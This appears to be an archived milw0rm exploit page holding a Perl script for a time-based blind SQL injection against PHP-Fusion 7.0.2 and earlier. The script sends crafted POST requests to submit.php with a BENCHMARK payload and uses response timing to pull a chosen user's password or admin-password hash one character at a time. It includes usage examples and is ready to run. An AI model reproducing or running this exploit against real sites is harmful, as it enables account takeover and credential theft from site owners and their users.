<html><head><title>PHP-Fusion <= 7.0.2 Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
# -------------------------------------------------------
# PHP-Fusion &lt;= 7.00.2 Remote Blind SQL Injection Exploit
# by athos - staker[at]hotmail[dot]it
# download on http://php-fusion.co.uk
# -------------------------------------------------------
# Usage:
# perl xpl.pl host/path prefix user_id user_pwd target_id
# perl xpl.pl localhost/php-fusion fusion 5 anarchy 1
# -------------------------------------------------------
# Note: magic_quotes_gpc off &amp;&amp; register globals on
#       don't add me on msn messenger 
#       my email staker.38@gmail.com
# 
# Greetz: str0ke,The:Paradox,darkjoker,Key and #cancer :D 
# -------------------------------------------------------
# This is pratically the same vulnerability of 6.01.14
# version (http://milw0rm.com/exploits/5470) found by 
# The:Paradox. PHP-Fusion's coder seems not interested in
# Web Security, isn't him? 
# -------------------------------------------------------
# User Password:  my $field = &quot;user_password&quot; ;
# Admin Password: my $field = &quot;user_admin_password&quot;;                   
# -------------------------------------------------------

use strict;
use Digest::MD5('md5_hex');
use LWP::UserAgent;


my $field = &quot;user_password&quot;;
my ($stop,$start,$hash);


my $domain = shift;
my $ptable = shift;
my $ulogin = shift;
my $plogin = shift;
my $userid = shift or &amp;usage;

my @chars = (48..57, 97..102); 
my $substr = 1; 
my $http = new LWP::UserAgent;



sub send_request
{ 
     my $post = undef;
     my $host = $domain;
     my $param = shift @_ or die $!;
  
     $host  .= &quot;/submit.php?stype=l&quot;;

     $http-&gt;default_header('Cookie' =&gt; &quot;fusion_user=${ulogin}.&quot;.md5_hex($plogin));
     $post = $http-&gt;post('http://'.$host,[
                                 'link_category'    =&gt; 1,
                                 'link_name'        =&gt; 1,
                                 'link_url'         =&gt; 1,
                                 'link_description' =&gt; 1,
                                 'submit_link'      =&gt; 'Submit+Link',
                                 'submit_info[pwn]' =&gt; $param,
                               ]);
 
}


sub give_char
{
     my $send = undef;
     my ($charz,$uidz) = @_;
  
     $send = &quot;' or (select if((ascii(substring&quot;.
             &quot;($field,$uidz,1))=$charz),&quot;.
             &quot;benchmark(230000000,char(0)),&quot;.
            &quot;0) from ${ptable}_users where user_id=$userid))#&quot;;

     return $send;
}


for(1..32) 
{
     foreach my $set(@chars)
     {
          my $start = time();
    
          send_request(give_char($set,$substr));
    
          my $stop = time();
  
         if($stop - $start &gt; 6)
         { 
              syswrite(STDOUT,chr($set));
              $substr++; 
              last;
        }
    }
}

sub usage
{
      print &quot;PHP-Fusion &lt;= 7.0.2 Remote Blind SQL Injection Exploit\n&quot;;
      print &quot;by athos - staker[at]hotmail[dot]it\n&quot;;
      print &quot;Usage: perl $0 [host/path] [table prefix] [id] [password] [target id]\n&quot;;
      print &quot;Usage: perl $0 localhost/php-fusion fusion 5 p4ssw0rd 1\n&quot;; 
      exit; 
}     

# milw0rm.com [2008-12-24]</pre></html>